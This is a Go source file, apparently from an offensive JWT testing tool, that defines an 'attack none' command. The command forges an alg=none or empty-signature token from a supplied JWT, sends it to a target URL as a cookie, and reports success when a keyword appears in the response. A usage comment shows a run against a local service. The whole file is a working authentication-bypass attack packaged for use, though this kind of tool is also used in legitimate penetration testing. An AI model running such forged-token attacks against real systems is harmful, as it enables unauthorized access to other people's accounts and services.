package cmd

import (
	"fmt"

	"github.com/pikqi/jwtool/internal"
	"github.com/spf13/cobra"
)

var attackNoneCmd = &cobra.Command{
	Use:   "none <JWT>",
	Short: "Forge an alg=none token and send it to the target",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		url, _ := cmd.Flags().GetString("url")
		cookie, _ := cmd.Flags().GetString("cookie")
		keyword, _ := cmd.Flags().GetString("keyword")
		emptySig, _ := cmd.Flags().GetBool("empty")

		fmt.Println("[*] Forging alg=none token...")
		forged, err := internal.ExploitNone(args[0], emptySig)
		if err != nil {
			return fmt.Errorf("Failed to forge token: %w", err)
		}
		fmt.Println("[*] Forged token: ", forged)

		fmt.Printf("[*] Sending to %s...\n", url)
		result, err := internal.SendWithJWT(url, forged, internal.SendOpts{
			CookieName: cookie,
			Keyword:    keyword,
		})
		if err != nil {
			return fmt.Errorf("request failed: %w", err)
		}

		if result.Success {
			fmt.Printf("Attack succeeded — %s\n", result.Reason)
		} else {
			fmt.Printf("Attack failed — %s\n", result.Reason)
		}

		return nil
	},
}

func init() {
	attackNoneCmd.Flags().BoolP("empty", "e", false, "Use empty signature instead of alg=none")
	attackCmd.AddCommand(attackNoneCmd)
}

/*
jwtool attack none <JWT> \
  --url http://localhost:5010/dashboard \
  --cookie jwt_token \
  --keyword "Welcome"
*/
